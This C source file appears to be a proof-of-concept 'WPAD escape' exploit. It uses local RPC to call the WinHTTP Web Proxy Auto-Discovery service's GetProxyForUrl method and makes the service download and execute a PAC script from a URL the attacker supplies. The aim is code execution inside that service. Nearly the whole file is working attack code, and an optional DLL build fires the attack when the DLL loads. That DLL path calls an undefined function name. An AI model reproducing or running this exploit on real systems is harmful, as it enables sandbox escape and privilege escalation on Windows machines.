#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "IWinHttpAutoProxySvc_h.h"

#pragma comment(lib, "rpcrt4.lib")

////////
////////
// Global settings
////////

#define EXE_BUILD

////////
////////
// Debug logic
////////

void DebugLog(const wchar_t *Format, ...) {
    va_list Args;
    wchar_t Buffer[10000] = { 0 };
    va_start(Args, Format);
    wvsprintf(Buffer, Format, Args);
    va_end(Args);

    //MessageBoxW(0, Buffer, L"WPAD escape", 0);
#ifdef EXE_BUILD
    printf("%ws\r\n", Buffer);
#endif
}

////////
////////
// RPC helpers
////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-allocate-function
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-free-function
    free(ptr);
}

////////
////////
// Primary WPAD RPC logic
////////

RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
    INT nReply = 0;
    uint32_t dwInt = 0;
    uint32_t dwWinHttpStatusCode = 0;
    RPC_WSTR StringBinding = NULL;
    RPC_STATUS RpcStatus = RPC_S_OK;
    RPC_BINDING_HANDLE hRpcBinding = NULL;
    HANDLE hNameResTrkRecord = NULL;
    wchar_t AutoConfigUrl[5000] = { 0 };
    //wchar_t PacUrlRandom[200] = { 0 };
    RPC_ASYNC_STATE RpcAsyncState = { 0 };
    tagProxyResolveUrl ProxyResolveUrl = { 0 };
    WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
    WINHTTP_SESSION_OPTIONS SessionOptions = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };

    // Make a unique variation of the specified PAC URL to avoid WPAD cache issues

    _snwprintf_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), ARRAYSIZE(AutoConfigUrl), L"%ws?%lld", PacUrl, __rdtsc()
    );

    //wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
    //wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);
    DebugLog(L"... target PAC URL: %ws", AutoConfigUrl);

    ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
    ProxyResolveUrl.Domain = L"www.google.com";
    ProxyResolveUrl.Seperator = L"/";
    ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
    ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB

    AutoProxyOptions.lpszAutoConfigUrl = AutoConfigUrl;
    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;

    /*
    The below constants are UNKNOW at the moment.
    This was found by reversing winhttp.dll.
    */

    SessionOptions.dwMaxTimeout = 0xffffffff;
    SessionOptions.dwTimeout1 = 0x0000ea60; // seems like dwTimeout 60000 MS
    SessionOptions.Member2 = 0x00000005;    // maybe drift timeout
    SessionOptions.dwTimeout2 = 0x00007530;
    SessionOptions.dwTimeout3 = 0x00007530;
    SessionOptions.Member5 = 0x00000000;

    /* 
    The RPC call to WPAD follows a simple pattern:
       1. Create an RPC string binding handle on the ncalrpc protocol
       2. Generate an RPC_BINDING_HANDLE (to be used in all future operations) from the string binding handle
       3. Create an asynchronous RPC state handle which will be used for the actual call to GetProxyForUrl
       4. Make the RPC call to GetProxyForUrl within the WPAD service and wait for its completion via the event object in its RPC async handle
    */

    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)L"ncalrpc", 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol

    if (RpcStatus == RPC_S_OK) {
        RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle

        if (RpcStatus == RPC_S_OK) {
            // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl

            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));

            if (RpcStatus == RPC_S_OK) {
                RpcAsyncState.UserInfo = NULL;
                RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
                RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state

                RpcTryExcept
                {
                    /*
                    Call the GetProxyForUrl interface method which is responsible for initiating
                    the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
                    */

                    DebugLog(L"... calling GetProxyForUrl RPC method.");

                    GetProxyForUrl(
                        &RpcAsyncState,
                        hRpcBinding,
                        &ProxyResolveUrl,
                        &AutoProxyOptions,
                        &SessionOptions,
                        0,
                        NULL,
                        &dwInt,
                        &ProxyResult,
                        &hNameResTrkRecord,
                        &dwWinHttpStatusCode
                    );

                    DebugLog(L"... GetProxyForUrl returned (async)");
                }
                RpcExcept(1) {
                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
                }
                RpcEndExcept

                uint32_t dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);

                if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
                    CloseHandle(RpcAsyncState.u.hEvent);
                }
                
                if (dwWaitResult == WAIT_OBJECT_0) {
                    DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
                    RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
                }
                else {
                    DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
                    RpcAsyncCancelCall(&RpcAsyncState, TRUE);
                }
            }
            else {
                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
            }

            RpcBindingFree(&hRpcBinding);
        }
        else {
            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%X", RpcStatus);
        }

        RpcStringFreeW(&StringBinding);
    }
    else {
        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
    }

    return RpcStatus;
}


#ifdef DLL_BUILD
BOOL APIENTRY DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            WpadEscape(TARGET_PAC_URL);
            Sleep(INFINITE);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
#else

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    if (nArgc < 2) {
        DebugLog(L"... no PAC URL argument provided");
    }
    else {
        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
    }

    return 0;
}
#endif